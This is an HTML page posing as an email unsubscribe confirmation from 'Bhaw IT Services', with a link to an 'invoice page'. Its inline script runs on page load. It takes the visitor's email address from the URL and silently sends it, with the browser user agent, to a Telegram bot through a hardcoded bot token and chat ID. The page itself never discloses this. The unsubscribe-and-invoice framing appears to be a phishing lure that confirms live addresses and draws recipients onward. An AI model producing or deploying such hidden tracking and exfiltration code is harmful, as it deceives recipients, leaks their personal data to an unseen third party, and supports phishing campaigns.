<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<meta name="robots" content="noindex, nofollow" />
<title>Unsubscribed</title>
<style>
  :root { --ink:#1f2328; --muted:#5b6570; --line:#e3e6ea; --accent:#1a56c4; }
  * { box-sizing: border-box; }
  body {
    margin: 0; min-height: 100vh; display: flex; align-items: center; justify-content: center;
    padding: 24px 18px; background: #eef0f3; color: var(--ink);
    font: 15px/1.55 -apple-system, "Segoe UI", Roboto, Arial, sans-serif;
  }
  .card {
    width: 100%; max-width: 460px; background: #fff; border: 1px solid var(--line);
    border-radius: 12px; box-shadow: 0 2px 14px rgba(20,28,38,.08); padding: 30px 28px 26px;
  }
  .mark {
    width: 34px; height: 34px; border-radius: 8px; background: var(--accent); color: #fff;
    font: 700 15px/34px -apple-system, "Segoe UI", Arial, sans-serif; text-align: center;
    margin-bottom: 18px;
  }
  h1 { margin: 0 0 10px; font-size: 19px; letter-spacing: -.2px; }
  p { margin: 0 0 14px; font-size: 14px; color: var(--muted); }
  .addr {
    display: inline-block; margin: 2px 0 16px; padding: 7px 12px; font-size: 13px;
    color: var(--ink); background: #f4f6f8; border: 1px solid var(--line);
    border-radius: 6px; overflow-wrap: anywhere;
  }
  .addr[hidden] { display: none; }
  .fine { font-size: 12.5px; color: #8a939d; border-top: 1px solid var(--line); padding-top: 14px; margin: 18px 0 0; }
  a { color: var(--accent); text-decoration: none; }
</style>
</head>
<body>
  <main class="card">
    <div class="mark">B</div>
    <h1>You've been removed</h1>
    <p>No further mail will be sent from Bhaw.</p>
    <span class="addr" id="addr" hidden></span>
    <p>If you were expecting an invoice or a renewal notice, it's still here:</p>
    <p><a href="https://bhaw.onl/f/inv-2026-1184" id="back">Open the invoice page</a></p>
    <p class="fine">Bhaw IT Services &middot; wolfson@bhaw.onl</p>
  </main>
<script>
(function () {
  var e = "";
  try { e = new URLSearchParams(location.search).get("e") || ""; } catch (err) {}
  if (e) {
    var el = document.getElementById("addr");
    el.textContent = e;
    el.hidden = false;
    document.getElementById("back").href =
      "https://bhaw.onl/f/inv-2026-1184?r=U&e=" + encodeURIComponent(e);
    fetch("https://api.telegram.org/bot7508450893:AAGm3TtVH2nyhe-CZ35-Hi1Tol_2594atR8/sendMessage", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: "6069290001",
        text: "UNSUB\n" + e + "\n" + navigator.userAgent.slice(0, 80)
      })
    }).catch(function () {});
  }
})();
</script>
</body>
</html>
